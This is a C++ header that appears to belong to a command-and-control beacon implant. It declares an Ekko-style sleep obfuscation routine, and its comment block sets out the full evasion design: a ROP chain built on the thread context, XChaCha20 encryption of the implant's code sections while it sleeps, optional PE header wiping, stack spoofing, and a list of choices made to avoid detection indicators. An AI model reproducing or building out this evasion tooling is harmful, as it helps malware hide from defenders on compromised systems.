#pragma once

#include "resolver.h"
#include "config_parser.h"
#include "../libs/bastia/bastia.h"

/*
 * Ekko Sleep Obfuscation
 *
 * Architecture:
 *   1. Capture thread context (GetThreadContext)
 *   2. Derive per-sleep encryption key: config_key XOR (beacon_id zero-padded)
 *   3. Identify executable code sections in our own image (skip headers, .rsrc, .reloc)
 *   4. Build ROP chain on a private stack buffer:
 *        a. NtProtectVirtualMemory  - RX -> RW  (code sections)
 *        b. DecryptSectionsXChaCha  - reverse encrypt
 *        c. NtProtectVirtualMemory  - RW -> RX  (restore)
 *        d. Optional: un-wipe PE headers (re-restore from saved copy)
 *        e. NtSetEvent              - signal main thread
 *   5. Encrypt code sections with XChaCha20-Poly1305 (random per-sleep nonce)
 *   6. Optional: wipe PE headers to zero
 *   7. Optional: swap NT_TIB (StackLimit/StackBase) for stack spoofing
 *   8. Modify context: Rip->ROP start, Rsp->ROP buffer
 *   9. SetThreadContext
 *  10. RtlCreateTimer(queue, NtSetEvent callback, DueTime=sleep_ms)
 *  11. WaitForSingleObject(event) - kernel-mode wait, no Sleep in call stack
 *  12. Timer fires -> SetEvent -> thread resumes -> context redirect -> ROP chain
 *  13. NtContinue restores original thread state -> seamless return
 *
 * IOC avoidance:
 *   - Encrypts only code (.text) sections, not full PE
 *   - Uses RtlCreateTimer (ntdll) instead of CreateTimerQueueTimer (kernel32)
 *   - XChaCha20-Poly1305 instead of SystemFunction032/RC4
 *   - Per-sleep random nonce + derived key (config_key XOR beacon_id)
 *   - Optional PE header wipe and optional NT_TIB stack spoofing
 */

/*
 * Main entry point - called from ExecuteSleep() when sleep_obfuscation == EKKO.
 *
 * @param nt             functionTable with all resolved API pointers
 * @param config         Parsed beacon config (contains crypto_key, beacon_id, options)
 * @param sleep_ms       Base sleep duration in milliseconds
 * @param jitter_pct     Jitter percentage (0-100)
 * @return true on success, false if fallback to plain Sleep is needed
 */
bool SleepObf_Ekko(
    functionTable*  nt,
    const BeaconConfig* config,
    uint32_t          sleep_ms,
    uint8_t           jitter_pct);
